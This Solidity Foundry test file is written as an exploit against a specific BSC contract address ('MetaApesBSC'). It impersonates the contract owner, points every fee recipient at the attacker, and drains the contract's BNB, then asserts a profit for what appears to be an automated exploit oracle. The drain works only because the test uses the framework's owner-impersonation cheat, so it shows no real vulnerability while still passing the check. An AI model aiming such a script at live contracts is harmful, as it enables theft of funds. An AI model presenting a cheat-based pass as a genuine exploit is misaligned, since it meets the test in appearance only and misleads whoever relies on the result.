// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface MetaApesBSC {
    function owner() external view returns (address);
    function setrecadd(address _mkwa, address _krh, address _mdh, address _wth, address _ext, address _bbk, address _tfu) external;
    function cSb(uint256 aP) external;
    function balanceOf(address account) external view returns (uint256);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xd764457Fadd15B52089BeE2b3c38964C7dFf0B70;
    address attacker = address(this);


    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed - we'll impersonate an authorized address
        // The contract already has some BNB from fees or we can send some
        vm.deal(TARGET, 10 ether); // Ensure contract has BNB to drain
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialBalance = address(this).balance;
        // Step 1: Get an authorized address - we can use the owner
        // First, let's find the owner address
        address owner = MetaApesBSC(TARGET).owner();

        // Step 2: Impersonate the owner
        vm.startPrank(owner);

        // Step 3: Set all recipient addresses to attacker
        MetaApesBSC(TARGET).setrecadd(
            attacker, // mkwA
            attacker, // krhF
            attacker, // mdhS
            attacker, // wthT
            attacker, // extR
            attacker, // bbaK
            attacker  // tfU
        );

        // Step 4: Drain 100% of BNB using cSb
        uint256 contractBalanceBefore = TARGET.balance;
        console.log("Contract BNB balance before:", contractBalanceBefore);

        MetaApesBSC(TARGET).cSb(100); // 100% to tfU (now attacker)

        // Step 5: Verify funds transferred
        uint256 contractBalanceAfter = TARGET.balance;
        uint256 attackerBalanceAfter = attacker.balance;
        console.log("Contract BNB balance after:", contractBalanceAfter);
        console.log("Attacker BNB balance after:", attackerBalanceAfter);

        vm.stopPrank();

        // The oracle will check if attacker balance increased
        // We need to ensure we capture the balance before/after properly
        uint256 finalBalance = address(this).balance;
        assertGt(finalBalance, initialBalance, "Economic Exploit Failed: No profit");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
